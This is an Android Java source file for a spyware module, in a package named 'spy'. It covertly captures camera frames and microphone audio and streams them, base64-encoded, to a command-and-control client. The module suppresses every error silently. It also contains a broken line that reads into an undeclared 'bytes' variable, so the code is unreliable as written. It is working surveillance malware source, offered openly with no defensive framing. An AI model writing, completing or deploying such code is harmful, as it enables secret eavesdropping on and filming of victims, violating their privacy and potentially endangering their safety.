package ai.m4zk1play.spy;

import android.content.Context;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.Image;
import android.media.ImageReader;
import android.media.MediaRecorder;
import android.os.Handler;
import android.os.HandlerThread;

import java.io.ByteArrayOutputStream;
import java.nio.ByteBuffer;

/** Kamera (Camera2) + audio mic. */
public class MediaModule {

    private CameraManager cm;
    private String camId;
    private ImageReader reader;
    private HandlerThread thread;
    private Handler handler;
    private AudioRecord rec;
    private boolean micOn;
    private C2Client client;

    public void bind(Context ctx, C2Client c) {
        client = c;
        cm = (CameraManager) ctx.getSystemService(Context.CAMERA_SERVICE);
        thread = new HandlerThread("mzk-media");
        thread.start();
        handler = new Handler(thread.getLooper());
    }

    public void camera(Context ctx, boolean front) {
        try {
            stopCamera();
            if (cm == null) return;
            for (String id : cm.getCameraIdList()) {
                Integer facing = cm.getCameraCharacteristics(id)
                        .get(CameraCharacteristics.LENS_FACING);
                if (facing == null) continue;
                boolean isFront = facing == CameraCharacteristics.LENS_FACING_FRONT;
                if (isFront == front) { camId = id; break; }
            }
            if (camId == null) return;
            reader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2);
            reader.setOnImageAvailableListener(r -> {
                Image img = null;
                try {
                    img = r.acquireLatestImage();
                    if (img == null) return;
                    ByteBuffer buf = img.getPlanes()[0].getBuffer();
                    byte[] data = new byte[buf.remaining()];
                    buf.get(bytes);
                    if (client != null) client.stream("cam", Modules.base64(data), null);
                } catch (Exception ignored) {
                } finally {
                    if (img != null) img.close();
                }
            }, handler);
            cm.openCamera(camId, new android.hardware.camera2.CameraDevice.StateCallback() {
                @Override public void onOpened(android.hardware.camera2.CameraDevice cam) {
                    try {
                        android.hardware.camera2.CaptureRequest.Builder b =
                                cam.createCaptureRequest(android.hardware.camera2.CameraDevice.TEMPLATE_PREVIEW);
                        b.addTarget(reader.getSurface());
                        cam.createCaptureSession(java.util.Collections.singletonList(reader.getSurface()),
                                new android.hardware.camera2.CameraCaptureSession.StateCallback() {
                                    @Override public void onConfigured(android.hardware.camera2.CameraCaptureSession s) {
                                        try {
                                            s.setRepeatingRequest(b.build(), null, handler);
                                        } catch (Exception ignored) { }
                                    }
                                    @Override public void onConfigureFailed(android.hardware.camera2.CameraCaptureSession s) { }
                                }, handler);
                    } catch (Exception ignored) { }
                }
                @Override public void onDisconnected(android.hardware.camera2.CameraDevice cam) { }
                @Override public void onError(android.hardware.camera2.CameraDevice cam, int e) { }
            }, handler);
        } catch (Exception ignored) {
        }
    }

    public void stopCamera() {
        try { if (reader != null) reader.close(); } catch (Exception ignored) { }
        reader = null;
        camId = null;
    }

    public void mic(boolean on) {
        if (on == micOn) return;
        micOn = on;
        if (!on) {
            try { if (rec != null) rec.stop(); } catch (Exception ignored) { }
            try { if (rec != null) rec.release(); } catch (Exception ignored) { }
            rec = null;
            return;
        }
        final int rate = 16000;
        int min = AudioRecord.getMinBufferSize(rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
        rec = new AudioRecord(MediaRecorder.AudioSource.MIC, rate,
                AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, Math.max(min, 8192));
        rec.startRecording();
        new Thread(() -> {
            byte[] buf = new byte[4096];
            ByteArrayOutputStream wav = new ByteArrayOutputStream();
            while (micOn) {
                int n = rec.read(buf, 0, buf.length);
                if (n > 0) wav.write(buf, 0, n);
                if (wav.size() > 24000) {
                    if (client != null) client.stream("mic", Modules.base64(wav.toByteArray()), null);
                    wav.reset();
                }
            }
        }, "mzk-mic").start();
    }

    public void stopAll() {
        mic(false);
        stopCamera();
    }

    public static Bitmap decode(byte[] b) {
        return BitmapFactory.decodeByteArray(b, 0, b.length);
    }
}
